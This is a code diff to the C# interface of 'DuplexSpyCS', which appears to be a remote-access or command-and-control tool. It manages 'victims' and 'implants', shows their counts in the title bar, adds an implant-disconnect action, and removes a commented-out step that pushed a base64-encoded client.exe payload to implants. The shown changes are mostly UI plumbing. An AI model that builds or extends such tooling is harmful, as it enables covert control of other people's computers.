@@ -206,7 +206,10 @@ namespace DuplexSpyCS
                             v.remoteOS = cmd[4];
                             v.ID = online_id;
 
-                            Invoke(new Action(() => listView1.Items.Add(item)));
+                            listView1.Items.Add(item);
+                            ListViewItem k = listView2.FindItemWithText(online_id);
+                            if (k != null)
+                                GetVictim(k).Disconnect();
 
                             MakeNewPortfolio(v);
 
@@ -1343,8 +1346,9 @@ namespace DuplexSpyCS
 
         private void fnImplantConnected(Listener l, Victim v, string[] aszMsg)
         {
-            ListViewItem item = new ListViewItem(v.socket.RemoteEndPoint.ToString());
-            for (int i = 0; i < aszMsg.Length; i++)
+            ListViewItem item = new ListViewItem(aszMsg[0]);
+            item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
+            for (int i = 1; i < aszMsg.Length; i++)
                 item.SubItems.Add(aszMsg[i]);
             item.Tag = v;
 
@@ -1355,32 +1359,25 @@ namespace DuplexSpyCS
 
                 listView2.Items.Add(item);
             }));
-
-            /*
-            string szClient = "client.exe";
-            if (!File.Exists(szClient))
-                return;
-
-            string szMainClient = C2.ini_manager.Read("[Implant]", "Payload");
-            if (string.IsNullOrEmpty(szMainClient))
-            {
-
-            }
-
-            v.SendCommand("init|" + Convert.ToBase64String(File.ReadAllBytes(szClient)));
-            */
         }
 
         private void fnImplantDisconnected(Victim v)
         {
-            Invoke(new Action(() =>
+            try
             {
-                ListViewItem item = listView2.FindItemWithText(v.socket.RemoteEndPoint.ToString());
-                if (item == null)
-                    return;
+                Invoke(new Action(() =>
+                {
+                    ListViewItem item = listView2.FindItemWithText(v.ID);
+                    if (item == null)
+                        return;
 
-                listView2.Items.Remove(item);
-            }));
+                    listView2.Items.Remove(item);
+                }));
+            }
+            catch (Exception ex)
+            {
+
+            }
         }
 
         /// <summary>
@@ -1582,7 +1579,12 @@ namespace DuplexSpyCS
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            Text = $"DuplexSpyCS v1.0.0 by ISSAC | Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | Online[{listView1.Items.Count}] | Selected [{listView1.SelectedItems.Count}]";
+            Text = $"DuplexSpyCS v1.0.0 by ISSAC | " +
+                $"Port[{(listener == null || listener.port == -1 ? string.Empty : listener.port)}] | " +
+                $"Online[{listView1.Items.Count}] - " +
+                $"Implant[{listView2.Items.Count}] - " +
+                $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
+                $"Selected({tabControl1.SelectedTab.Text}) [{(tabControl1.SelectedIndex == 0 ? listView1.SelectedItems.Count : listView2.SelectedItems.Count)}]";
         }
 
         private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
@@ -2083,10 +2085,12 @@ namespace DuplexSpyCS
 
         private void toolStripButton6_Click(object sender, EventArgs e)
         {
-            frmTipoff f = new frmTipoff();
+            frmTipoff f = new frmTipoff(listener);
+            f.Text = "Tipoff Request";
             f.Show();
         }
 
+        //Implant - Invoke
         private void toolStripMenuItem42_Click(object sender, EventArgs e)
         {
             List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
@@ -2096,10 +2100,18 @@ namespace DuplexSpyCS
             frmImplantInvoke f = new frmImplantInvoke(lVictim);
             f.Show();
         }
-
+        //Implant - Disconnect
         private void toolStripMenuItem43_Click(object sender, EventArgs e)
         {
+            List<Victim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
 
+            Task.Run(() =>
+            {
+                foreach (Victim v in lVictim)
+                {
+                    v.encSend(0, 0, clsEZData.fnGenerateRandomStr());
+                }
+            });
         }
     }
 }
